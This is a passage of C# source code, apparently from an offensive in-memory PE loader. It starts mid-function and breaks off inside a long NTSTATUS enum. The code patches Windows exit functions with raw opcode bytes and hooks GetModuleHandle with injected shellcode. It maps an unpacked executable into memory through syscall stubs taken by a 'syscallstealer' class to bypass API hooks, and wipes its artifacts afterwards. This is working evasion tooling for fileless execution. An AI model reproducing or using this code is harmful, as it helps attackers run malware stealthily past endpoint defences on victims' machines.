            if (!Utils.PatchAddress(_ppImageString, _pOriginalImageString))
            {

            }

            Marshal.WriteInt16(_pLength, 0, _originalLength);

            Marshal.WriteInt16(_pMaxLength, 0, _originalMaxLength);

        }
    }

    internal class ExitPatcher
    {
        private byte[] _terminateProcessOriginalBytes;
        private byte[] _ntTerminateProcessOriginalBytes;
        private byte[] _rtlExitUserProcessOriginalBytes;
        private byte[] _corExitProcessOriginalBytes;

        public bool PatchExit()
        {
            var hKernelbase = NativeDeclarations.GetModuleHandle("kernelbase");
            var pExitThreadFunc = NativeDeclarations.GetProcAddress(hKernelbase, "ExitThread");

            var exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            /*
                mov rcx, 0x0 #takes first arg
                mov rax, <ExitThread> # 
                push rax
                ret
             */
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

#if DEBUG
            Console.WriteLine("[*] Patching kernelbase!TerminateProcess, redirecting flow to kernelbase!ExitThread");
#endif
            _terminateProcessOriginalBytes =
                Utils.PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
            {
                return false;
            }
#if DEBUG
            Console.WriteLine("[*] Patching mscoree!CorExitProcess, redirecting flow to kernelbase!ExitThread");
#endif
            _corExitProcessOriginalBytes =
                Utils.PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
            {
                return false;
            }

#if DEBUG
            Console.WriteLine("[*] Patching ntdll!NtTerminateProcess, redirecting flow to kernelbase!ExitThread");
#endif
            _ntTerminateProcessOriginalBytes =
                Utils.PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
            {
                return false;
            }

#if DEBUG
            Console.WriteLine("[*] Patching ntdll!RtlExitUserProcess, redirecting flow to kernelbase!ExitThread");
#endif
            _rtlExitUserProcessOriginalBytes =
                Utils.PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
            {
                return false;
            }

#if DEBUG
            Console.WriteLine("[+] Exit functions patched\n");
#endif
            return true;
        }

        internal void ResetExitFunctions()
        {
#if DEBUG
            Console.WriteLine("[*] Reverting patch to kernelbase!TerminateProcess");
#endif
            Utils.PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);
#if DEBUG
            Console.WriteLine("[*] Reverting patch to mscoree!CorExitProcess");
#endif
            Utils.PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);
#if DEBUG
            Console.WriteLine("[*] Reverting patch to ntdll!NtTerminateProcess");
#endif
            Utils.PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);
#if DEBUG
            Console.WriteLine("[*] Reverting patch to ntdll!RtlExitUserProcess");
#endif
            Utils.PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);
#if DEBUG
            Console.WriteLine("[+] Exit patches reverted\n");
#endif
        }
    }

    internal class ExtraAPIPatcher
    {
        private const int JMP_PATCH_LENGTH = 12;
        private byte[] _originalGetModuleHandleBytes;
        private string _getModuleHandleFuncName;
        private IntPtr _newFuncAlloc;
        private int _newFuncBytesCount;

        public bool PatchAPIs(IntPtr baseAddress)
        {
            _getModuleHandleFuncName = Encoding.UTF8.Equals(Program.encoding) ? "GetModuleHandleW" : "GetModuleHandleA";


            WriteNewFuncToMemory(baseAddress);

            if (PatchAPIToJmpToNewFunc()) return true;
            return false;
        }

        private bool PatchAPIToJmpToNewFunc()
        {
            // Patch the API to jump to out new func code
            var pointerBytes = BitConverter.GetBytes(_newFuncAlloc.ToInt64());

            /*
                0:  48 b8 88 77 66 55 44    movabs rax,<address of newFunc>
                7:  33 22 11
                a:  ff e0                   jmp    rax
             */
            var patchBytes = new List<byte>() { 0x48, 0xB8 };
            patchBytes.AddRange(pointerBytes);

            patchBytes.Add(0xFF);
            patchBytes.Add(0xE0);

            _originalGetModuleHandleBytes =
                Utils.PatchFunction("kernelbase", _getModuleHandleFuncName, patchBytes.ToArray());

            return _originalGetModuleHandleBytes != null;
        }

        private IntPtr WriteNewFuncToMemory(IntPtr baseAddress)
        {
            // Write some code to memory that will return our base address if arg0 is null or revert back to GetModuleAddress if not.
            var newFuncBytes = new List<byte>() { 0x48, 0x85, 0xc9, 0x75, 0x0b };

            var moduleHandle = NativeDeclarations.GetModuleHandle("kernelbase");
            var getModuleHandleFuncAddress = NativeDeclarations.GetProcAddress(moduleHandle, _getModuleHandleFuncName);

            newFuncBytes.Add(0x48);
            newFuncBytes.Add(0xB8);

            var baseAddressPointerBytes = BitConverter.GetBytes(baseAddress.ToInt64());

            newFuncBytes.AddRange(baseAddressPointerBytes);

            newFuncBytes.Add(0xC3);
            newFuncBytes.Add(0x48);
            newFuncBytes.Add(0xB8);

            var pointerBytes = BitConverter.GetBytes(getModuleHandleFuncAddress.ToInt64() + JMP_PATCH_LENGTH);

            newFuncBytes.AddRange(pointerBytes);

            var originalInstructions = new byte[JMP_PATCH_LENGTH];
            Marshal.Copy(getModuleHandleFuncAddress, originalInstructions, 0, JMP_PATCH_LENGTH);
            newFuncBytes.AddRange(originalInstructions);

            newFuncBytes.Add(0xFF);
            newFuncBytes.Add(0xE0);
            /*
            0:  48 85 c9                test   rcx,rcx
            3:  75 0b                   jne    +0x0b
            5:  48 b8 88 77 66 55 44    movabs rax,<Base Address of mapped PE>
            c:  33 22 11
            f:  c3                      ret
            10:  48 b8 88 77 66 55 44   movabs rax,<Back to GetModuleHandle>
            17:  33 22 11
            ... original replaced opcodes...
            1a:  ff e0                  jmp    rax
            */
            _newFuncAlloc = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)newFuncBytes.Count,
                NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);

            Marshal.Copy(newFuncBytes.ToArray(), 0, _newFuncAlloc, newFuncBytes.Count);
            _newFuncBytesCount = newFuncBytes.Count;

            NativeDeclarations.VirtualProtect(_newFuncAlloc, (UIntPtr)newFuncBytes.Count,
                NativeDeclarations.PAGE_EXECUTE_READ, out _);
            return _newFuncAlloc;
        }

        public bool RevertAPIs()
        {
            Utils.PatchFunction("kernelbase", _getModuleHandleFuncName, _originalGetModuleHandleBytes);
            Utils.ZeroOutMemory(_newFuncAlloc, _newFuncBytesCount);
            Utils.FreeMemory(_newFuncAlloc);
            return true;
        }
    }

    internal class FileDescriptorPair
    {
        public IntPtr Read { get; set; }

        public IntPtr Write { get; set; }
    }

    internal class FileDescriptorRedirector
    {
        private const int STD_INPUT_HANDLE = -10;
        private const int STD_OUTPUT_HANDLE = -11;
        private const int STD_ERROR_HANDLE = -12;
        private const uint BYTES_TO_READ = 1024;

        private IntPtr _oldGetStdHandleOut;
        private IntPtr _oldGetStdHandleIn;
        private IntPtr _oldGetStdHandleError;

        private FileDescriptorPair _kpStdOutPipes;
        private FileDescriptorPair _kpStdInPipes;
        private Task<string> _readTask;

        public bool RedirectFileDescriptors()
        {
            _oldGetStdHandleOut = GetStdHandleOut();
            _oldGetStdHandleIn = GetStdHandleIn();
            _oldGetStdHandleError = GetStdHandleError();

#if DEBUG
            Console.WriteLine("[*] Creating STDOut Pipes to redirect to");
#endif
            _kpStdOutPipes = CreateFileDescriptorPipes();
            if (_kpStdOutPipes == null)
            {
                Console.WriteLine("[-] Unable to create STDOut Pipes");
                return false;
            }

#if DEBUG
            Console.WriteLine("[*] Creating STDIn Pipes to redirect to");
#endif
            _kpStdInPipes = CreateFileDescriptorPipes();
            if (_kpStdInPipes == null)
            {
                Console.WriteLine("[-] Unable to create STDIn Pipes");
                return false;
            }

            if (!RedirectDescriptorsToPipes(_kpStdOutPipes.Write, _kpStdInPipes.Write, _kpStdOutPipes.Write))
            {
                Console.WriteLine("[-] Unable redirect descriptors to pipes");
                return false;
            }
            return true;
        }

        public string ReadDescriptorOutput()
        {
#if DEBUG
            Console.WriteLine("[*] Retrieving the 'subprocess' stdout & stderr");
#endif
            while (!_readTask.IsCompleted)
            {
#if DEBUG
                Console.WriteLine("[*] Waiting for the task reading from pipe to finish...");
#endif
                Thread.Sleep(2000);
            }

            return _readTask.Result;
        }

        public void ResetFileDescriptors()
        {
#if DEBUG
            Console.WriteLine("[*] Reset StdError, StdOut, StdIn");
#endif
            RedirectDescriptorsToPipes(_oldGetStdHandleOut, _oldGetStdHandleIn, _oldGetStdHandleError);

            ClosePipes();
        }

        private static IntPtr GetStdHandleOut()
        {
            return NativeDeclarations.GetStdHandle(STD_OUTPUT_HANDLE);
        }

        private static IntPtr GetStdHandleError()
        {
            return NativeDeclarations.GetStdHandle(STD_ERROR_HANDLE);
        }

        internal void ClosePipes()
        {
#if DEBUG
            Console.WriteLine("[*] Closing StdOut pipes");
#endif
            CloseDescriptors(_kpStdOutPipes);
#if DEBUG
            Console.WriteLine("[*] Closing StdIn pipes");
#endif
            CloseDescriptors(_kpStdInPipes);
        }

        internal void StartReadFromPipe()
        {
            _readTask = Task.Factory.StartNew(() =>
            {
                var output = "";

                var buffer = new byte[BYTES_TO_READ];
                byte[] outBuffer;

                var ok = NativeDeclarations.ReadFile(_kpStdOutPipes.Read, buffer, BYTES_TO_READ, out var bytesRead, IntPtr.Zero);

                if (!ok)
                {
                    
                    return "";
                }

                if (bytesRead != 0)
                {
                    outBuffer = new byte[bytesRead];
                    Array.Copy(buffer, outBuffer, bytesRead);
                    output += Encoding.Default.GetString(outBuffer);
                }

                while (ok)
                {
                    ok = NativeDeclarations.ReadFile(_kpStdOutPipes.Read, buffer, BYTES_TO_READ, out bytesRead, IntPtr.Zero);

                    if (bytesRead != 0)
                    {
                        outBuffer = new byte[bytesRead];
                        Array.Copy(buffer, outBuffer, bytesRead);
                        output += Encoding.Default.GetString(outBuffer);
                    }
                }

                return output;
            });
        }

        private static IntPtr GetStdHandleIn()
        {
            return NativeDeclarations.GetStdHandle(STD_INPUT_HANDLE);
        }

        private static void CloseDescriptors(FileDescriptorPair stdoutDescriptors)
        {
            // Need to close write before read else it hangs as could still be writing
            if (stdoutDescriptors.Write != IntPtr.Zero)
            {
                NativeDeclarations.CloseHandle(stdoutDescriptors.Write);
#if DEBUG
                Console.WriteLine("[+] CloseHandle write");
#endif
            }

            if (stdoutDescriptors.Read != IntPtr.Zero)
            {
                NativeDeclarations.CloseHandle(stdoutDescriptors.Read);
#if DEBUG
                Console.WriteLine("[+] CloseHandle read");
#endif
            }
        }

        private static FileDescriptorPair CreateFileDescriptorPipes()
        {
            var lpSecurityAttributes = new NativeDeclarations.SECURITY_ATTRIBUTES();
            lpSecurityAttributes.nLength = Marshal.SizeOf(lpSecurityAttributes);
            lpSecurityAttributes.bInheritHandle = 1;

            var outputStdOut = NativeDeclarations.CreatePipe(out var read, out var write, ref lpSecurityAttributes, 0);
            if (!outputStdOut)
            {
#if DEBUG
                Console.WriteLine("[-] Cannot create File Descriptor pipes");
#endif
                return null;
            }

            return new FileDescriptorPair
            {
                Read = read,
                Write = write
            };
        }

        private static bool RedirectDescriptorsToPipes(IntPtr hStdOutPipes, IntPtr hStdInPipes, IntPtr hStdErrPipes)
        {
            var bStdOut = NativeDeclarations.SetStdHandle(STD_OUTPUT_HANDLE, hStdOutPipes);
            if (bStdOut)
            {

            }
            else
            {

                return false;
            }

            var bStdError = NativeDeclarations.SetStdHandle(STD_ERROR_HANDLE, hStdErrPipes);
            if (bStdError)
            {

            }
            else
            {

                return false;
            }

            var bStdIn = NativeDeclarations.SetStdHandle(STD_INPUT_HANDLE, hStdInPipes);
            if (bStdIn)
            {

            }
            else
            {

                return false;
            }

            return true;
        }
    }


    internal class ImportResolver
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool FreeLibrary(IntPtr hModule);

        private const int
            IDT_SINGLE_ENTRY_LENGTH =
                20; // Each Import Directory Table entry is 20 bytes long https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#import-directory-table

        private const int IDT_IAT_OFFSET = 16; // Offset in IDT to Relative Virtual Address to the Import Address Table for this DLL

        private const int IDT_DLL_NAME_OFFSET = 12; // Offset in IDT to DLL name for this DLL
        private const int ILT_HINT_LENGTH = 2; // Length of the 'hint' prefix to the function name in the ILT/IAT

        private readonly List<string> _originalModules = new List<string>();

        public void ResolveImports(PELoader pe, long currentBase)
        {
            // Save the current loaded modules so can unload new ones afterwards
            var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {

                _originalModules.Add(module.ModuleName);
            }

            // Resolve Imports
            var pIDT = (IntPtr)(currentBase + pe.OptionalHeader64.ImportTable.VirtualAddress);
            var dllIterator = 0;
            while (true)
            {
                var pDLLImportTableEntry = (IntPtr)(pIDT.ToInt64() + IDT_SINGLE_ENTRY_LENGTH * dllIterator);

                var iatRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_IAT_OFFSET));
                var pIAT = (IntPtr)(currentBase + iatRVA);

                var dllNameRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_DLL_NAME_OFFSET));
                var pDLLName = (IntPtr)(currentBase + dllNameRVA);
                var dllName = Marshal.PtrToStringAnsi(pDLLName);

                if (string.IsNullOrEmpty(dllName))
                {
#if DEBUG
                    Console.WriteLine("[*] End of DLLs");
#endif
                    break;
                }

                var handle = NativeDeclarations.LoadLibrary(dllName);
#if DEBUG
                Console.WriteLine("[+] Loaded {0}", dllName);
#endif

                var pCurrentIATEntry = pIAT;
                while (true)
                {
                    // For each DLL iterate over its functions in the IAT and patch the IAT with the real address https://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/
                    try
                    {
                        var pDLLFuncName =
                            (IntPtr)(currentBase + Marshal.ReadInt32(pCurrentIATEntry) +
                                      ILT_HINT_LENGTH); // Skip two byte 'hint' http://sandsprite.com/CodeStuff/Understanding_imports.html
                        var dllFuncName = Marshal.PtrToStringAnsi(pDLLFuncName);

                        if (string.IsNullOrEmpty(dllFuncName))
                        {

                            break;
                        }

                        var pRealFunction = NativeDeclarations.GetProcAddress(handle, dllFuncName);
                        if (pRealFunction.ToInt64() == 0)
                        {

                        }
                        else
                        {

                            Marshal.WriteInt64(pCurrentIATEntry, pRealFunction.ToInt64());
                        }

                        pCurrentIATEntry =
                            (IntPtr)(pCurrentIATEntry.ToInt64() +
                                      IntPtr.Size); // Shift the current entry to point to the next entry along, as each entry is just a pointer this is one IntPtr.Size
                    }
                    catch (Exception e)
                    {

                    }
                }

                dllIterator++;
            }

        }

        internal void ResetImports()
        {
#if DEBUG
            Console.WriteLine("[*] Cleaning up loaded DLLs");
#endif
            var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {
                if (!_originalModules.Contains(module.ModuleName))
                {

                    if (!FreeLibrary(module.BaseAddress))
                    {

                    }
                }
            }
#if DEBUG
            Console.WriteLine("[+] Loaded DLLs cleaned up\n");
#endif
        }
    }


    internal class PEMapper
    {
        private IntPtr _codebase;
        private PELoader _pe;



        public void MapPEIntoMemory(byte[] unpacked, out PELoader peLoader, out long currentBase)
        {
#if DEBUG
            Console.WriteLine("[*] Mapping PE into memory");
#endif
            _pe = peLoader = new PELoader(unpacked);

            Process currentProcess = Process.GetCurrentProcess();
            FreshSyscall syscallstealer = new FreshSyscall();
            string[] requiredSyscalls = { "NtAllocateVirtualMemory" };
            syscallstealer.GrabSyscallStub(requiredSyscalls);
            NativeDeclarations.NtAllocateVirtualMemory fSyscallNTAVM = (NativeDeclarations.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscallstealer.StubAddressTable["NtAllocateVirtualMemory"], typeof(NativeDeclarations.NtAllocateVirtualMemory));


            IntPtr regionsize = (IntPtr)_pe.OptionalHeader64.SizeOfImage;
            fSyscallNTAVM(currentProcess.Handle, ref _codebase, IntPtr.Zero, ref regionsize, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
            //_codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, _pe.OptionalHeader64.SizeOfImage,NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
            currentBase = _codebase.ToInt64();


            // Copy Sections
            for (var i = 0; i < _pe.FileHeader.NumberOfSections; i++)
            {
                regionsize = (IntPtr)_pe.ImageSectionHeaders[i].SizeOfRawData;
                IntPtr startaddress = (IntPtr)(currentBase + _pe.ImageSectionHeaders[i].VirtualAddress);
                fSyscallNTAVM(currentProcess.Handle, ref startaddress, IntPtr.Zero, ref regionsize, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);

                //var y = NativeDeclarations.VirtualAlloc((IntPtr)(currentBase + _pe.ImageSectionHeaders[i].VirtualAddress),_pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
                Marshal.Copy(_pe.RawBytes, (int)_pe.ImageSectionHeaders[i].PointerToRawData, startaddress, (int)_pe.ImageSectionHeaders[i].SizeOfRawData);
            }

            // Perform Base Relocation
            var delta = currentBase - (long)_pe.OptionalHeader64.ImageBase;

            // Modify Memory Based On Relocation Table
            var relocationTable =
                (IntPtr)(currentBase + (int)_pe.OptionalHeader64.BaseRelocationTable.VirtualAddress);
            var relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

            var imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
            var nextEntry = relocationTable;
            var sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
            var offset = relocationTable;

            while (true)
            {
                var pRelocationTableNextBlock = (IntPtr)(relocationTable.ToInt64() + sizeofNextBlock);

                var relocationNextEntry =
                    (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocationTableNextBlock, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

                var pRelocationEntry = (IntPtr)(currentBase + relocationEntry.VirtualAdress);

                for (var i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++) // TODO figure out magic numbers
                {
                    var value = (ushort)Marshal.ReadInt16(offset, 8 + 2 * i); // TODO figure out magic numbers
                    var type = (ushort)(value >> 12); // TODO figure out magic numbers
                    var fixup = (ushort)(value & 0xfff); // TODO figure out magic numbers

                    switch (type)
                    {
                        case 0x0:
                            break;
                        case 0xA:
                            var patchAddress = (IntPtr)(pRelocationEntry.ToInt64() + fixup);
                            var originalAddr = Marshal.ReadInt64(patchAddress);
                            Marshal.WriteInt64(patchAddress, originalAddr + delta);
                            break;
                    }
                }

                offset = (IntPtr)(relocationTable.ToInt64() + sizeofNextBlock);
                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                relocationEntry = relocationNextEntry;
                nextEntry = (IntPtr)(nextEntry.ToInt64() + sizeofNextBlock);

                if (relocationNextEntry.SizeOfBlock == 0)
                {
#if DEBUG
                    Console.WriteLine("[*] No more blocks to map");
#endif
                    break;
                }
            }


        }

        internal void ClearPE()
        {
            var size = _pe.OptionalHeader64.SizeOfImage;
            Utils.ZeroOutMemory(_codebase, (int)size);
            Utils.FreeMemory(_codebase);

#if DEBUG
            Console.WriteLine("[*] PE artifacts cleared from memory\n");
#endif
        }

        internal void SetPagePermissions()
        {
            Process currentProcess = Process.GetCurrentProcess();
            FreshSyscall syscallstealer = new FreshSyscall();
            string[] requiredSyscalls = { "NtAllocateVirtualMemory" };
            syscallstealer.GrabSyscallStub(requiredSyscalls);
            NativeDeclarations.NtAllocateVirtualMemory fSyscallNTAVM = (NativeDeclarations.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscallstealer.StubAddressTable["NtAllocateVirtualMemory"], typeof(NativeDeclarations.NtAllocateVirtualMemory));

            for (var i = 0; i < _pe.FileHeader.NumberOfSections; i++)
            {
                var execute = ((uint)_pe.ImageSectionHeaders[i].Characteristics & NativeDeclarations.IMAGE_SCN_MEM_EXECUTE) != 0;
                var read = ((uint)_pe.ImageSectionHeaders[i].Characteristics & NativeDeclarations.IMAGE_SCN_MEM_READ) != 0;
                var write = ((uint)_pe.ImageSectionHeaders[i].Characteristics & NativeDeclarations.IMAGE_SCN_MEM_WRITE) != 0;

                var protection = NativeDeclarations.PAGE_EXECUTE_READWRITE;

                if (execute && read && write)
                {
                    protection = NativeDeclarations.PAGE_EXECUTE_READWRITE;
                }
                else if (!execute && read && write)
                {
                    protection = NativeDeclarations.PAGE_READWRITE;
                }
                else if (!write && execute && read)
                {
                    protection = NativeDeclarations.PAGE_EXECUTE_READ;
                }
                else if (!execute && !write && read)
                {
                    protection = NativeDeclarations.PAGE_READONLY;
                }
                else if (execute && !read && !write)
                {
                    protection = NativeDeclarations.PAGE_EXECUTE;
                }
                else if (!execute && !read && !write)
                {
                    protection = NativeDeclarations.PAGE_NOACCESS;
                }

                IntPtr regionsize = (IntPtr)_pe.ImageSectionHeaders[i].SizeOfRawData;
                IntPtr y = (IntPtr)(_codebase.ToInt64() + _pe.ImageSectionHeaders[i].VirtualAddress);
                fSyscallNTAVM(currentProcess.Handle, ref y, IntPtr.Zero, ref regionsize, NativeDeclarations.MEM_COMMIT, protection);


                //var y = NativeDeclarations.VirtualProtect((IntPtr)(_codebase.ToInt64() + _pe.ImageSectionHeaders[i].VirtualAddress),(UIntPtr)_pe.ImageSectionHeaders[i].SizeOfRawData, protection, out _);
            }
        }
    }


}

public static class Native
{
    [Flags]
    public enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,
        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL_ACCESS = 0x0000037F
    }

    public enum NTSTATUS : uint
    {
        // Success
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,

        // Informational
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,

        // Warning
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,

        // Error
        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
        PagefileQuota = 0xc0000007,
        InvalidHandle = 0xc0000008,
        BadInitialStack = 0xc0000009,
        BadInitialPc = 0xc000000a,
        InvalidCid = 0xc000000b,
        TimerNotCanceled = 0xc000000c,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        InvalidDeviceRequest = 0xc0000010,
        EndOfFile = 0xc0000011,
        WrongVolume = 0xc0000012,
        NoMediaInDevice = 0xc0000013,
        NoMemory = 0xc0000017,
        ConflictingAddresses = 0xc0000018,
        NotMappedView = 0xc0000019,
        UnableToFreeVm = 0xc000001a,
        UnableToDeleteSection = 0xc000001b,
        IllegalInstruction = 0xc000001d,
        AlreadyCommitted = 0xc0000021,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        ObjectTypeMismatch = 0xc0000024,
        NonContinuableException = 0xc0000025,
        BadStack = 0xc0000028,
        NotLocked = 0xc000002a,
        NotCommitted = 0xc000002d,
        InvalidParameterMix = 0xc0000030,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        ObjectPathSyntaxBad = 0xc000003b,
        DataOverrun = 0xc000003c,
        DataLate = 0xc000003d,
        DataError = 0xc000003e,
        CrcError = 0xc000003f,
        SectionTooBig = 0xc0000040,
        PortConnectionRefused = 0xc0000041,
        InvalidPortHandle = 0xc0000042,
        SharingViolation = 0xc0000043,
        QuotaExceeded = 0xc0000044,
        InvalidPageProtection = 0xc0000045,
        MutantNotOwned = 0xc0000046,
        SemaphoreLimitExceeded = 0xc0000047,
        PortAlreadySet = 0xc0000048,
        SectionNotImage = 0xc0000049,
        SuspendCountExceeded = 0xc000004a,
        ThreadIsTerminating = 0xc000004b,
        BadWorkingSetLimit = 0xc000004c,
        IncompatibleFileMap = 0xc000004d,
        SectionProtection = 0xc000004e,
        EasNotSupported = 0xc000004f,
        EaTooLarge = 0xc0000050,
        NonExistentEaEntry = 0xc0000051,
        NoEasOnFile = 0xc0000052,
        EaCorruptError = 0xc0000053,
        FileLockConflict = 0xc0000054,
        LockNotGranted = 0xc0000055,
        DeletePending = 0xc0000056,
        CtlFileNotSupported = 0xc0000057,
        UnknownRevision = 0xc0000058,
        RevisionMismatch = 0xc0000059,
        InvalidOwner = 0xc000005a,
        InvalidPrimaryGroup = 0xc000005b,
        NoImpersonationToken = 0xc000005c,
        CantDisableMandatory = 0xc000005d,
        NoLogonServers = 0xc000005e,
        NoSuchLogonSession = 0xc000005f,
        NoSuchPrivilege = 0xc0000060,
        PrivilegeNotHeld = 0xc0000061,
        InvalidAccountName = 0xc0000062,
        UserExists = 0xc0000063,
        NoSuchUser = 0xc0000064,
        GroupExists = 0xc0000065,
        NoSuchGroup = 0xc0000066,
        MemberInGroup = 0xc0000067,
        MemberNotInGroup = 0xc0000068,
        LastAdmin = 0xc0000069,
        WrongPassword = 0xc000006a,
        IllFormedPassword = 0xc000006b,
        PasswordRestriction = 0xc000006c,
        LogonFailure = 0xc000006d,
        AccountRestriction = 0xc000006e,
        InvalidLogonHours = 0xc000006f,
        InvalidWorkstation = 0xc0000070,
        PasswordExpired = 0xc0000071,
        AccountDisabled = 0xc0000072,
        NoneMapped = 0xc0000073,
        TooManyLuidsRequested = 0xc0000074,
        LuidsExhausted = 0xc0000075,
        InvalidSubAuthority = 0xc0000076,
        InvalidAcl = 0xc0000077,
        InvalidSid = 0xc0000078,
